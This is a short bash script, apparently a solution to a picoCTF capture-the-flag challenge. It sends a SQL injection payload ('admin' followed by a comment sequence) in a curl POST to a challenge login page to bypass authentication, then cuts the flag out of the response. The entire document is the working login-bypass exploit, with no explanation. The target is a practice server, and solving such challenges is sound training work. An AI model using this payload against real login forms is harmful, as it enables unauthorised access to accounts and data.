#!/bin/bash
#get flag script 2023:07:08
#Creator 0xtheM7
curl -X POST http://jupiter.challenges.picoctf.org:64649/login.php -d "username=admin%27+--&password=1&debug=0" --silent | cut -d ":" -f2 | cut -d "<" -f1 | cut -d " " -f2 
